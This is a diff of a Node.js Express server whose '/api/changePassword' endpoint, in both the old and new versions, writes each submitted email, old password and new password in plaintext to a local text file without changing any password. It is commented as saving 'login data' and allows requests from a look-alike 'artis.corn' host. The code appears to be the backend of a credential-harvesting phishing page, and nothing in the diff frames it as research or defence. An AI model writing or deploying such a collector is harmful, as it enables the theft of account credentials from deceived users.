@@ -1,59 +1,36 @@
 const express = require('express');
 const fs = require('fs');
-const cors = require('cors');
-const path = require('path');
-
+const cors = require('cors'); // CORS allows your React app to communicate with your backend server
 const app = express();
 
 // Middleware
+app.use(cors());
 app.use(express.json());
-app.use(cors()); // OK because frontend & backend share same origin on Render
+app.use(cors({
+  origin: ['http://localhost:3000', 'http://artis.corn:3000']
+}));
 
-// ============================
-// API ROUTE
-// ============================
+// Endpoint to save login data
 app.post('/api/changePassword', (req, res) => {
   const { email, old_password, new_password } = req.body;
 
+  // Create the data string
   const timestamp = new Date().toISOString();
-  const data = `Timestamp: ${timestamp}
-Email: ${email}
-Old Password: ${old_password}
-New Password: ${new_password}
-==================================================
+  const data = `Timestamp: ${timestamp}\nEmail: ${email} \nOld Password: ${old_password}\nNew Password: ${new_password}\n${'='.repeat(50)}\n\n`;
 
-`;
-
+  // Append to file
   fs.appendFile('login_data.txt', data, (err) => {
     if (err) {
       console.error('Error writing to file:', err);
-      return res.status(500).json({
-        success: false,
-        message: 'Failed to save data'
-      });
+      return res.status(500).json({ success: false, message: 'Failed to save data' });
     }
 
     console.log('Password change saved!');
-    res.json({
-      success: true,
-      message: 'Password change saved!'
-    });
+    res.json({ success: true, message: 'Password change saved!' });
   });
 });
 
-// ============================
-// SERVE REACT (IMPORTANT)
-// ============================
-app.use(express.static(path.join(__dirname, 'build')));
-
-app.get('*', (req, res) => {
-  res.sendFile(path.join(__dirname, 'build', 'index.html'));
-});
-
-// ============================
-// PORT (RENDER FIX)
-// ============================
-const PORT = process.env.PORT || 5000;
+const PORT = 5000;
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+  console.log(`Server running on http://localhost:${PORT}`);
 });
